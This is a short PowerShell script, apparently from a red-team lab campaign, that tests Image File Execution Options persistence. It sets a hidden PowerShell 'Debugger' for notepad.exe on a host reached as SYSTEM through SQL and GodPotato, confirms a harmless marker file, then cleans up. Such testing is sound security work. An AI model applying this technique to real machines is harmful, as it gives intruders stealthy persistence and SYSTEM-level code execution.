# WT106 - IFEO persistence validation on mbr01 (SYSTEM via SQL+GodPotato channel)
# Creates HKLM IFEO Debugger for notepad.exe -> powershell marker writer,
# triggers notepad, verifies marker, cleans up. Run from ws01.
$block = @'
$key = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe'
$marker = 'C:\Windows\Temp\wt106-marker.txt'
try {
    if (Test-Path $key) { Remove-Item -Path $key -Recurse -Force }
    New-Item -Path $key -Force | Out-Null
    $dbg = 'powershell.exe -NoProfile -WindowStyle Hidden -Command "Write-Output WT106-IFEO > C:\Windows\Temp\wt106-marker.txt; exit"'
    Set-ItemProperty -Path $key -Name 'Debugger' -Value $dbg
    Write-Output ('IFEO_DEBUGGER_SET=' + (Get-ItemProperty -Path $key -Name Debugger).Debugger)
    Start-Process -FilePath 'C:\Windows\System32\notepad.exe' -WindowStyle Hidden -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 4
    $markerOk = Test-Path $marker
    Write-Output ('IFEO_MARKER=' + $markerOk)
    if ($markerOk) { Write-Output ('IFEO_MARKER_CONTENT=' + (Get-Content $marker -Raw).Trim()) }
} finally {
    Remove-Item -Path $key -Recurse -Force -ErrorAction SilentlyContinue
    if (Test-Path $marker) { Remove-Item $marker -Force -ErrorAction SilentlyContinue }
    Write-Output 'WT106_CLEANUP_DONE'
}
Write-Output 'WT106_DONE'
'@
& C:\Tools\ADTools\campaign-a-t043-system-exec.ps1 -ScriptBlock $block
